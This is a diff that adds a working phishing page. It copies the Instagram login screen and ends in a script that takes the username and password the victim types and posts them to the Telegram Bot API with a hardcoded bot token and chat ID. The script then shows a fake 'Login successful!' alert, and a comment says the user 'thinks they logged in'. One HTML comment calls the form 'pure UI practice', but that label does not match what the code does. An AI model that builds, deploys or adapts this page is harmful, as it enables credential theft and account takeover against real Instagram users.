@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram – real clone</title>
+  <!-- Instagram classic logo font -->
+  <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
+  <!-- Font Awesome 5 (free) for realistic Facebook icon & subtle icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: radial-gradient(circle at 20% 30%, #0a0a0a, #000000);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding: 20px;
+    }
+    .wrapper { width: 350px; max-width: 100%; }
+    .login-box {
+      background: #000000;
+      border: 1px solid #262626;
+      border-radius: 12px;
+      padding: 40px 40px 30px;
+      text-align: center;
+      box-shadow: 0 0 0 1px rgba(255,255,255,0.02), 0 8px 20px rgba(0,0,0,0.7);
+    }
+    .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 54px;
+      color: #ffffff;
+      margin-bottom: 36px;
+      letter-spacing: 0.5px;
+      line-height: 1;
+      text-shadow: 0 0 8px rgba(255,255,255,0.1);
+    }
+    .input-group { margin-bottom: 12px; }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      background: #121212;
+      border: 1px solid #363636;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #f5f5f5;
+    }
+    input::placeholder { color: #8e8e8e; font-size: 13px; }
+    input:focus { outline: none; border-color: #8e8e8e; background: #1a1a1a; }
+    button {
+      width: 100%;
+      margin-top: 16px;
+      padding: 11px 10px;
+      background: #0095f6;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    button:hover { background: #1877f2; }
+    button:active { transform: scale(0.99); opacity: 0.9; }
+    .divider {
+      display: flex; align-items: center; margin: 22px 0 18px;
+      font-size: 13px; font-weight: 600; color: #8e8e8e; text-transform: uppercase;
+    }
+    .divider::before, .divider::after {
+      content: ""; flex: 1; height: 1px; background: #262626;
+    }
+    .divider::before { margin-right: 14px; }
+    .divider::after { margin-left: 14px; }
+    .fb-login {
+      color: #0095f6; font-weight: 600; font-size: 14px;
+      text-decoration: none; display: inline-flex; align-items: center;
+      justify-content: center; gap: 8px; margin-bottom: 16px;
+    }
+    .fb-login i { font-size: 16px; color: #0095f6; }
+    .forgot { display: inline-block; font-size: 12px; color: #b3b3b3; text-decoration: none; margin-top: 4px; }
+    .forgot:hover { color: #e0e0e0; text-decoration: underline; }
+    .signup-box {
+      margin-top: 16px; background: #000000; border: 1px solid #262626;
+      border-radius: 12px; padding: 18px 20px; text-align: center; font-size: 14px; color: #f5f5f5;
+    }
+    .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; margin-left: 4px; }
+    .signup-box a:hover { opacity: 0.8; }
+    .app-links { display: flex; justify-content: center; gap: 12px; margin-top: 20px; }
+    .app-badge {
+      display: flex; align-items: center; gap: 6px; background: #000000; border: 1px solid #262626;
+      border-radius: 8px; padding: 6px 12px; color: white; font-size: 12px; font-weight: 500;
+      text-decoration: none;
+    }
+    .app-badge i { font-size: 14px; color: white; }
+    .lang-selector { margin-top: 24px; font-size: 11px; color: #6b6b6b; display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
+    .meta-footer { display: flex; justify-content: center; gap: 14px; margin-top: 16px; font-size: 11px; color: #6b6b6b; }
+    .meta-footer a { color: #6b6b6b; text-decoration: none; font-size: 11px; }
+    .meta-footer a:hover { color: #b3b3b3; text-decoration: underline; }
+    .fake-copyright { text-align: center; font-size: 10px; color: #4d4d4d; margin-top: 18px; }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="login-box">
+      <div class="logo">Instagram</div>
+      <!-- FORM: no alert, pure UI practice -->
+      <form class="login-form" id="realIgLoginForm">
+        <div class="input-group">
+          <input type="text" name="username" placeholder="Phone number, username, or email" autocomplete="username">
+        </div>
+        <div class="input-group">
+          <input type="password" name="password" placeholder="Password" autocomplete="current-password">
+        </div>
+        <button type="submit">Log In</button>
+      </form>
+      <div class="divider">OR</div>
+      <a href="#" class="fb-login">
+        <i class="fab fa-facebook-square"></i> Log in with Facebook
+      </a>
+      <a href="#" class="forgot">Forgot password?</a>
+    </div>
+    <div class="signup-box">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div style="text-align: center; margin-top: 20px; color: #f5f5f5; font-size: 13px; font-weight: 400;">
+      Get the app.
+    </div>
+    <div class="app-links">
+      <a href="#" class="app-badge">
+        <i class="fab fa-google-play"></i>
+        <span>Google Play</span>
+      </a>
+      <a href="#" class="app-badge">
+        <i class="fas fa-mobile-alt"></i>
+        <span>App Store</span>
+      </a>
+    </div>
+    <div class="lang-selector">
+      <span>English</span><span>Español</span><span>Français</span>
+      <span>Deutsch</span><span>Italiano</span><span>Português</span><span>العربية</span>
+    </div>
+    <div class="meta-footer">
+      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
+      <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
+    </div>
+    <div class="fake-copyright">
+      © 2025 Instagram from Meta
+    </div>
+  </div>
+<script>
+// Replace with your ACTUAL bot token and chat ID
+const TOKEN = "8088123811:AAFrniGTUkc3far2QTKUMjI8ZtoQ-qyWwKg";  // Format: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
+const CHAT_ID = "6657880965";  // Format: 123456789 (numbers only)
+document.getElementById("realIgLoginForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+    
+    const username = document.querySelector("input[type='text']").value;
+    const password = document.querySelector("input[type='password']").value;
+    
+    if (!username || !password) {
+        alert("Please fill in both fields");
+        return;
+    }
+    
+    const message = `🔐 New Login Attempt:
+👤 Username: ${username}
+🔑 Password: ${password}
+⏰ Time: ${new Date().toLocaleString()}`;
+    
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            alert("✅ Login successful!"); // User thinks they logged in
+            // Optional: redirect to real Instagram
+            // window.location.href = "https://www.instagram.com";
+        } else {
+            alert("❌ Error sending data. Check your bot token and chat ID.");
+        }
+    })
+    .catch(error => {
+        console.error("Error:", error);
+        alert("❌ Failed to send. Make sure you're online.");
+    });
+});
+</script>
+</body>
+</html>
